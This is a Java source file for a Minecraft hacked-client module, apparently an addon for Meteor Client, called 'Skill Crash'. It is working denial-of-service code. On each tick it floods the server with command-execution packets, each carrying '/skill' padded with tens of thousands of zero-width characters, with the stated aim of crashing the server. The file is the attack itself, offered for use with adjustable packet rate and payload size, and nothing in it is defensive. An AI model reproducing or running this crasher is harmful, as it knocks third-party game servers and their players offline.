package com.x310.clarity.modules.crashers;

import com.x310.clarity.Main;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;

public class SkillCrash extends Module {
    private final SettingGroup sg = settings.createGroup("Command Exec");

    private final Setting<Boolean> disableOnLeave = sg.add(new BoolSetting.Builder()
        .name("disable-on-leave")
        .description("Disables spam when you leave a server.")
        .defaultValue(true)
        .build()
    );

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnLeave.get()) {
            toggle();
        }
    }

    private final Setting<Integer> amount = sg.add(new IntSetting.Builder()
        .name("Amount")
        .description("Packets per tick.")
        .defaultValue(15)
        .min(1)
        .max(100)
        .sliderMax(100)
        .build()
    );

    private final Setting<Integer> buffer = sg.add(new IntSetting.Builder()
        .name("Buffer")
        .description("Spam buffer size.")
        .defaultValue(32760)
        .min(1)
        .max(32760)
        .sliderMax(32760)
        .build()
    );

    public SkillCrash() {
        super(Main.CRASH_GROUP, "Skill Crash", "Spams CommandExecution packets with /skill and big amount of bytes.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        ClientPlayNetworkHandler handler = mc.getNetworkHandler();
        String spam = "skill " + "\u200D".repeat(buffer.get());

        for (int i = 0; i < amount.get(); i++) {
            handler.sendPacket(new CommandExecutionC2SPacket(spam));
        }
    }
}
